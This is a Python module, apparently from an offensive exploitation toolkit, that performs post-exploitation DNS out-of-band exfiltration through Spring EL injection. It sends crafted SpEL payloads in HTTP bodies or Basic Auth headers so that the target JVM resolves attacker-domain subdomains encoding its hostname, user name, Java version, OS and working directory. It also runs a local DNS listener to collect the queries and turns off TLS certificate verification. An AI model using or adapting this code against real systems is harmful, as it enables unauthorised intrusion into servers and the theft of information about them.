# language: Python 3.10+, file: modules/post/dns_oob.py
# Post-exploitation: DNS out-of-band (OOB) beacon via SpEL injection.
#
# When direct output capture fails (firewall blocks reverse shell, blind RCE),
# DNS OOB exfiltrates data by encoding it as subdomains of an attacker-controlled
# domain and triggering the target JVM to resolve them.
#
# Exfiltration pipeline:
#   1. SpEL expressions collect: hostname, uid, java.version, os.name, cwd
#   2. Each value is encoded as a hex-safe DNS label (max 63 chars per label)
#   3. JVM resolves <encoded>.<token>.<oob_domain> via InetAddress.getByName()
#   4. Attacker captures queries on their DNS server (Burp Collaborator, interactsh, etc.)
#   5. Optionally: local UDP listener on --listen-port to capture queries directly
#
# SpEL delivery: same surface as cmd_exec.py (Spring EL injection via HTTP body/header)
#
# Note: DNS exfil depends on the JVM having outbound DNS access.
# Cloud-hosted targets almost always do. Air-gapped targets may not.

import base64
import hashlib
import json
import re
import socket
import ssl
import struct
import threading
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


# ─── Result dataclass ──────────────────────────────────────────────────────────

@dataclass
class DnsOobResult:
    success: bool = False
    # DNS queries received (each is a full subdomain query string)
    queries_received: list[str] = field(default_factory=list)
    # Decoded exfiltrated values
    exfiltrated: dict[str, str] = field(default_factory=dict)
    # OOB domain used
    oob_domain: str = ""
    # Number of SpEL expressions fired
    expressions_fired: int = 0
    notes: list[str] = field(default_factory=list)
    error: Optional[str] = None


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send(url: str, body: bytes, headers: dict,
          timeout: float = 10.0) -> tuple[int, str]:
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(4096).decode(errors="replace")
    except urllib.error.HTTPError as e:
        body_resp = ""
        try:
            body_resp = e.read(4096).decode(errors="replace")
        except Exception:
            pass
        return e.code, body_resp
    except Exception as e:
        return 0, str(e)


def _safe_label(value: str, max_len: int = 40) -> str:
    """Encode a value as a DNS-safe hex label (max 63 chars per DNS label)."""
    # hex-encode, then truncate to fit one DNS label
    encoded = value.encode(errors="replace").hex()
    return encoded[:min(max_len, 62)]


def _token(oob_domain: str) -> str:
    """Generate a short per-run token to correlate queries."""
    return hashlib.md5(f"{oob_domain}{time.time()}".encode()).hexdigest()[:8]


# ─── SpEL expression builders ─────────────────────────────────────────────────

def _spel_dns_beacon(subdomain: str, oob_domain: str) -> str:
    """
    SpEL expression that triggers an outbound DNS query to:
        <subdomain>.<oob_domain>
    Uses InetAddress.getByName() — available in all JDKs, no extra permissions.
    Wrapped in try/catch so a failed resolution doesn't crash the expression.
    """
    fqdn = f"{subdomain}.{oob_domain}"
    return (
        f"${{T(java.net.InetAddress).getByName(\"{fqdn}\")}}"
    )


def _spel_exfil(key: str, spel_value_expr: str, token: str, oob_domain: str) -> str:
    """
    SpEL that:
      1. Evaluates spel_value_expr to get the data string
      2. Hex-encodes it inline via String.format
      3. Triggers DNS resolution of <key>-<hex>.<token>.<oob_domain>
    Uses string concatenation safe for most SpEL contexts.
    """
    # Build: <key>-<hex_of_value>.<token>.<oob_domain>
    # SpEL doesn't have .toHexString natively for strings, so we use byte[] conversion
    return (
        f"${{T(java.net.InetAddress).getByName("
        f"new StringBuilder(\"{key}-\")"
        f".append(T(java.lang.Integer).toHexString({spel_value_expr}.hashCode()))"
        f".append(\".{token}.{oob_domain}\").toString()"
        f")}}"
    )


# ─── SpEL delivery ─────────────────────────────────────────────────────────────

def _deliver_spel(base_url: str, endpoint: dict, expression: str,
                  timeout: float) -> tuple[int, str]:
    """Inject SpEL via the endpoint surface (JSON body / header)."""
    path   = endpoint.get("path", "/")
    method = endpoint.get("method", "POST")
    ct     = endpoint.get("extra_headers", {}).get("Content-Type", "application/json")
    tmpl   = endpoint.get("body_template")

    if tmpl:
        body_str = tmpl.replace("{PAYLOAD}", expression)
        body = body_str.encode()
    else:
        body = json.dumps({"data": expression, "expression": expression}).encode()

    headers = {
        "User-Agent": "Java4Shell-DnsOob/1.0",
        "Content-Type": ct,
    }

    if endpoint.get("surface") == "HTTP-Basic-Auth":
        # Encode expression as base64 for Basic Auth header
        b64 = base64.b64encode(expression.encode()).decode()
        headers["Authorization"] = f"Basic {b64}"
        body = None
        method = "GET"

    url = base_url.rstrip("/") + path
    return _send(url, body, headers, timeout=timeout)


# ─── Local DNS listener ────────────────────────────────────────────────────────

class _DnsListener:
    """
    Minimal UDP DNS listener that captures A-record queries.
    Runs in a daemon thread. Stores received query names in self.queries.
    """
    def __init__(self, port: int = 1053):
        self.port    = port
        self.queries: list[str] = []
        self._sock   = None
        self._stop   = threading.Event()

    def start(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind(("0.0.0.0", self.port))
            self._sock.settimeout(0.5)
            t = threading.Thread(target=self._run, daemon=True)
            t.start()
            return True
        except Exception:
            return False

    def stop(self):
        self._stop.set()
        if self._sock:
            self._sock.close()

    def _run(self):
        while not self._stop.is_set():
            try:
                data, addr = self._sock.recvfrom(512)
                name = self._parse_query_name(data)
                if name:
                    self.queries.append(name)
            except socket.timeout:
                continue
            except Exception:
                break

    @staticmethod
    def _parse_query_name(data: bytes) -> Optional[str]:
        """Parse the QNAME from a raw DNS query packet."""
        try:
            # DNS header = 12 bytes; QNAME starts at offset 12
            pos = 12
            labels = []
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                pos += 1
                labels.append(data[pos:pos + length].decode(errors="replace"))
                pos += length
            return ".".join(labels) if labels else None
        except Exception:
            return None


# ─── Exfil payloads ───────────────────────────────────────────────────────────

_EXFIL_TARGETS = [
    # (label_key, SpEL_value_expression)
    ("hn",   "T(java.net.InetAddress).getLocalHost().getHostName()"),
    ("uid",  "T(java.lang.System).getProperty(\"user.name\")"),
    ("jv",   "T(java.lang.System).getProperty(\"java.version\")"),
    ("os",   "T(java.lang.System).getProperty(\"os.name\")"),
    ("pwd",  "T(java.lang.System).getProperty(\"user.dir\")"),
]

# Simple canary beacon (no data, just confirms OOB DNS works)
def _spel_canary(token: str, oob_domain: str) -> str:
    return f'${{T(java.net.InetAddress).getByName("canary.{token}.{oob_domain}")}}'


# ─── Main function ─────────────────────────────────────────────────────────────

def run_dns_oob(fp: FingerprintResult,
                core: ExploitCoreResult,
                oob_domain: str,
                listen: bool = False,
                listen_port: int = 1053,
                timeout: float = 15.0,
                verbose: bool = False) -> DnsOobResult:
    """
    Fire DNS OOB beacons via SpEL injection.
    Returns DnsOobResult with any queries captured by the local listener.
    """
    result = DnsOobResult(oob_domain=oob_domain)

    if not fp.reachable or not fp.profile:
        result.error = "Target not ready — dns_oob skipped."
        return result

    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    tok = _token(oob_domain)

    # ── Optionally start local DNS listener ────────────────────────────────
    listener = None
    if listen:
        listener = _DnsListener(port=listen_port)
        if listener.start():
            result.notes.append(f"Local DNS listener active on UDP :{listen_port}")
        else:
            result.notes.append(f"Could not bind UDP :{listen_port} — listening skipped (needs root or CAP_NET_BIND_SERVICE for port <1024)")
            listener = None

    # ── Phase 1: Canary beacon ─────────────────────────────────────────────
    canary_expr = _spel_canary(tok, oob_domain)
    fired = False
    for ep in endpoints:
        code, body = _deliver_spel(fp.target_url, ep, canary_expr, timeout)
        result.expressions_fired += 1
        if verbose:
            print(f"  [dns_oob] canary → {ep['path']} → HTTP {code}")
        if code != 0:
            fired = True
            result.notes.append(
                f"Canary DNS beacon fired via {ep['surface']} ({ep['path']}) — "
                f"check {oob_domain} for query: canary.{tok}.{oob_domain}"
            )
            break

    if not fired:
        result.error = "No endpoint reachable for SpEL injection."
        if listener:
            listener.stop()
        return result

    # Brief wait for DNS to propagate to our listener
    time.sleep(1.5)

    # ── Phase 2: Data exfiltration beacons ────────────────────────────────
    ep = endpoints[0]
    for key, spel_val in _EXFIL_TARGETS:
        expr = _spel_exfil(key, spel_val, tok, oob_domain)
        code, body = _deliver_spel(fp.target_url, ep, expr, timeout)
        result.expressions_fired += 1
        if verbose:
            print(f"  [dns_oob] exfil {key!r} → HTTP {code}")
        if code != 0:
            result.notes.append(
                f"Exfil beacon [{key}] → DNS query expected: {key}-<hex>.{tok}.{oob_domain}"
            )
        time.sleep(0.3)

    # ── Phase 3: Collect from listener ────────────────────────────────────
    if listener:
        time.sleep(2.0)   # give DNS time to arrive
        listener.stop()
        result.queries_received = listener.queries
        result.notes.append(f"Local listener captured {len(listener.queries)} DNS query(ies).")
        # Decode exfil queries
        for q in listener.queries:
            # Format: <key>-<hashcode_hex>.<token>.<oob_domain>
            m = re.match(r"^([a-z]+)-([0-9a-f]+)\.", q)
            if m:
                key, hex_hash = m.group(1), m.group(2)
                result.exfiltrated[key] = f"hash:{hex_hash} (resolve at DNS server for full value)"
        if result.queries_received:
            result.success = True
    else:
        result.notes.append(
            f"DNS queries sent — verify receipt at: {oob_domain}\n"
            f"  Token: {tok}\n"
            f"  Expected pattern: canary.{tok}.{oob_domain}"
        )
        # Mark success optimistically if SpEL was delivered (no way to confirm without listener)
        result.success = fired

    return result


# ─── Print ─────────────────────────────────────────────────────────────────────

def print_dns_oob(r: DnsOobResult):
    BOLD = "\033[1m"
    RST  = "\033[0m"
    GRN  = "\033[92m"
    YLW  = "\033[93m"
    CYN  = "\033[96m"
    RED  = "\033[91m"

    print(f"\n{BOLD}  ── DNS OOB Beacon ──{RST}")
    print(f"  OOB domain      : {r.oob_domain}")
    print(f"  Expressions fired: {r.expressions_fired}")
    status = f"{GRN}YES{RST}" if r.success else f"{YLW}pending (verify at DNS server){RST}"
    print(f"  Beacon delivered: {status}")

    if r.queries_received:
        print(f"\n  {GRN}[+] DNS queries captured ({len(r.queries_received)}){RST}:")
        for q in r.queries_received[:10]:
            print(f"    {q}")

    if r.exfiltrated:
        print(f"\n  {CYN}Decoded exfil data:{RST}")
        for k, v in r.exfiltrated.items():
            print(f"    {k}: {v}")

    for note in r.notes:
        print(f"  → {note}")

    if r.error:
        print(f"  {RED}[!] {r.error}{RST}")
    print()
